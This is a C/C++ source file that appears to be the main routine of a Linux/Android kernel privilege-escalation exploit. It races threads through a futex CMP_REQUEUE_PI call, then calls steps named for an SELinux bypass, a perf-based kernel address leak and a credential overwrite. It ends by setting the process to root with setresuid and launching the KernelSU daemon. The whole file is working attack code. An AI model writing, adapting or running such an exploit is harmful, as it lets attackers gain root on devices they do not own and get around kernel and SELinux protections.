#include "common.h"
#include "kprobe_leak.h"

#include <glob.h>
#include <limits.h>

static struct gl_perf_ctx s_perf;
static struct gl_perf_ctx s_brk;

static int spawn_threads(void)
{
    pthread_t th_owner;
    pthread_t th_cons;
    pthread_t th_wait;
    pthread_attr_t attr;

    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 1024 * 1024);

    if (pthread_create(&th_owner, &attr, gl_thread_a, NULL) != 0)
        return -1;
    if (pthread_create(&th_cons, &attr, gl_thread_b, NULL) != 0)
        return -1;
    if (pthread_create(&th_wait, &attr, gl_thread_c, NULL) != 0)
        return -1;

    pthread_detach(th_owner);
    pthread_detach(th_cons);
    pthread_detach(th_wait);

    pthread_attr_destroy(&attr);
    return 0;
}

static int requeue_once(void)
{
    long r;

    errno = 0;
    r = gl_futex_call((uint32_t *)&g_lock_target, GL_FUTEX_CMP_REQUEUE_PI,
                      1,
                      (const struct gl_timespec *)(long)1,
                      (uint32_t *)&g_lock_chain,
                      (uint32_t)g_lock_target.load(std::memory_order_acquire));

    g_route_done.store(1, std::memory_order_release);
    return (r == -35) ? 0 : -1;
}

int gl_trigger_run(void)
{
    if (spawn_threads() != 0)
        return -1;

    if (gl_wait_flag(&g_t1_entered, 1,
                     GL_ROUTE_WAIT_SEC * GL_MS_PER_SEC) != 0)
        return -1;

    if (gl_wait_flag(&g_lock_owner_done, 1, GL_ROUTE_WAIT_SEC * GL_MS_PER_SEC) != 0)
        return -1;

    if (gl_wait_flag(&g_t1_ready, 1, GL_ROUTE_WAIT_SEC * GL_MS_PER_SEC) != 0)
        return -1;

    usleep(GL_REQUEUE_SETTLE_US);

    if (requeue_once() != 0)
        return -1;

    if (gl_wait_flag(&g_chain_released, 1, GL_ROUTE_WAIT_SEC * GL_MS_PER_SEC) != 0)
        return -1;

    g_cycle_fresh.store(1, std::memory_order_release);
    return 0;
}

int gl_cycle_rearm(void)
{
    g_rearm_done.store(0, std::memory_order_release);
    g_rearm_go.store(1, std::memory_order_release);

    usleep(GL_REQUEUE_SETTLE_US);

    if (requeue_once() != 0)
        return -1;

    if (gl_wait_flag(&g_rearm_done, 1, GL_ROUTE_WAIT_SEC * GL_MS_PER_SEC) != 0)
        return -1;

    g_cycle_fresh.store(1, std::memory_order_release);
    return 0;
}

static const char *ksud_pick(char *buf, size_t bufsz)
{
    glob_t g;
    int i;

    memset(&g, 0, sizeof(g));

    if (glob(GL_KSUD_GLOB, 0, NULL, &g) == 0) {
        for (i = 0; i < (int)g.gl_pathc; i++) {
            if (access(g.gl_pathv[i], R_OK) != 0)
                continue;
            snprintf(buf, bufsz, "%s", g.gl_pathv[i]);
            globfree(&g);
            return buf;
        }
    }
    globfree(&g);

    if (access(GL_KSUD_FALLBACK, R_OK) == 0) {
        snprintf(buf, bufsz, "%s", GL_KSUD_FALLBACK);
        return buf;
    }

    return NULL;
}

int gl_ksud_late_load(void)
{
    char path[PATH_MAX];
    const char *chosen;
    pid_t pid;

    chosen = ksud_pick(path, sizeof(path));
    if (!chosen) {
        fputs("ksud not found\n", stderr);
        return -1;
    }

    pid = fork();
    if (pid < 0)
        return -1;

    if (pid == 0) {
        char *argv[3];

        argv[0] = (char *)"ksud";
        argv[1] = (char *)"late-load";
        argv[2] = NULL;
        execv(chosen, argv);
        _exit(127);
    }

    {
        int status = 0;
        uint64_t t0 = gl_monotonic_ms();

        for (;;) {
            pid_t r = waitpid(pid, &status, WNOHANG);

            if (r == pid)
                break;
            if (r < 0 && errno != EINTR)
                break;
            if (gl_monotonic_ms() - t0 >= GL_KSUD_WAIT_MS)
                break;
            usleep(20000);
        }
    }

    return 0;
}

int gl_run_all(void)
{
    const struct gl_offsets *off = gl_profile();
    const struct gl_runtime_ids *ids;
    uint64_t slide = 0;

    if (!off)
        return -1;

    g_scratch_lo = gl_alias_of_image(off->sym_init_task);
    g_init_area = gl_alias_of_image(off->sym_init_task);
    g_fake_lock = gl_alias_of_image(off->sym_zero_page) +
                  gl_fake_lock_region_offset();

    if (gl_trigger_run() != 0)
        return -1;

    if (gl_selinux_route(off) != 0)
        return -1;

    if (gl_perf_open(&s_perf, off, (pid_t)gl_get_tid()) != 0)
        return -1;

    if (gl_leak_slide(&s_perf, &slide) != 0) {

        gl_perf_close(&s_perf);
        return -1;
    }
    gl_perf_close(&s_perf);

    if (gl_leak_task(&s_brk, slide) != 0)
        return -1;

    ids = gl_runtime_ids();
    if (!ids || !ids->valid) {

        return -1;
    }

    if (gl_cred_install(off, ids) != 0) {

        return -1;
    }

    (void)setresuid(0, 0, 0);
    (void)setresgid(0, 0, 0);

    gl_drain_or_park();

    if (gl_ksud_late_load() != 0)
        return -1;

    return 0;
}
